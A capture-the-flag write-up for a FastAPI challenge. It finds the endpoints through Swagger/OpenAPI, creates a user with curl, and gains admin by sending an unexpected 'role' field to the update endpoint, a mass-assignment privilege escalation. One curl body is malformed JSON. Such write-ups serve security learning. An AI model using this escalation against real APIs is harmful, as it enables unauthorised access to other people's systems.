# Challenge description

Made my verty first API!

However I have to still integrate it with a frontend so can't do much at this point lol.
just for jumping from one place to another. Can you do that?

# Soluce

It's a simple FastAPI API, so we try to do a GET on /docs to see the documentation.

```html
HTTP/1.1 200 OK
date: Sun, 23 Feb 2025 09:32:04 GMT
server: uvicorn
content-length: 936
content-type: text/html; charset=utf-8


    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>SuperFastAPI - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- SwaggerUIBundle is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

It's a Swagger UI, so we can try a GET on /openapi.json to see the API documentation.

```json
HTTP/1.1 200 OK
date: Sun, 23 Feb 2025 09:32:48 GMT
server: uvicorn
content-length: 3166
content-type: application/json

{"openapi":"3.1.0","info":{"title":"SuperFastAPI","description":"Mt first API :)","version":"1.0.0"},"paths":{"/":{"get":{"summary":"Root","operationId":"root__get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/get/{username}":{"get":{"summary":"Get User","operationId":"get_user_get__username__get","parameters":[{"name":"username","in":"path","required":true,"schema":{"type":"string","title":"Username"}}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/create/{username}":{"post":{"summary":"Create User","operationId":"create_user_create__username__post","parameters":[{"name":"username","in":"path","required":true,"schema":{"type":"string","title":"Username"}}],"requestBody":{"required":true,"content":{"application/json":{"schema":{"$ref":"#/components/schemas/UserCreate"}}}},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/update/{username}":{"put":{"summary":"Update User","operationId":"update_user_update__username__put","parameters":[{"name":"username","in":"path","required":true,"schema":{"type":"string","title":"Username"}}],"requestBody":{"required":true,"content":{"application/json":{"schema":{"type":"object","title":"User Data"},"example":{"fname":"John","lname":"Doe","email":"john.doe@example.com","gender":"male"}}}},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/flag/{username}":{"get":{"summary":"Get Flag","operationId":"get_flag_flag__username__get","parameters":[{"name":"username","in":"path","required":true,"schema":{"type":"string","title":"Username"}}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}}},"components":{"schemas":{"HTTPValidationError":{"properties":{"detail":{"items":{"$ref":"#/components/schemas/ValidationError"},"type":"array","title":"Detail"}},"type":"object","title":"HTTPValidationError"},"UserCreate":{"properties":{"fname":{"type":"string","title":"Fname"},"lname":{"type":"string","title":"Lname"},"email":{"type":"string","title":"Email"},"gender":{"type":"string","title":"Gender"}},"type":"object","required":["fname","lname","email","gender"],"title":"UserCreate"},"ValidationError":{"properties":{"loc":{"items":{"anyOf":[{"type":"string"},{"type":"integer"}]},"type":"array","title":"Location"},"msg":{"type":"string","title":"Message"},"type":{"type":"string","title":"Error Type"}},"type":"object","required":["loc","msg","type"],"title":"ValidationError"}}}}
```

We can see that there is a /flag/{username} endpoint. We can try to do a GET on it with a username. With a random user, it say that the user doesn't exist. So let try to create a user with the /create/{username} endpoint. 

```bash
curl -X POST http://chall.2025.ctfcompetition.com/create/admin -H "Content-Type: application/json" -d '{"fname":"admin","lname":"admin","email":"admin", gender:"admin"}'
```

Now we can try to do a GET on the /flag/{username} endpoint with the admin user. It reply that the user is not an admin user.

Now we can try to edit the user with the /update/{username} endpoint. We can try

```bash
curl -X PUT http://chall.2025.ctfcompetition.com/update/admin -H "Content-Type: application/json" -d '{"fname":"admin","lname":"admin", "email":"admin", "gender":"admin", "role":"admin"}'
```

Now we can try to do a GET on the /flag/{username} endpoint with the admin user. It reply the flag.
